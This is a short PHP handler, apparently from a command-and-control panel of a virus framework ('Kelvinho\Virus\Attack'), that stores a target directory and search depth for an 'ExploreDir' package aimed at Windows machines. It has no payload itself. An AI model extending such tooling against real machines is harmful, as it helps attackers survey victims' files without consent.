<?php

use Kelvinho\Virus\Attack\Packages\Windows\OneTime\ExploreDir\ExploreDir;

/** @var ExploreDir $this */

$dir = $this->requestData->postCheck("dir");
$depth = $this->requestData->postCheck("depth");

$this->setRootDir($dir);
$this->setMaxDepth($depth);
$this->saveState();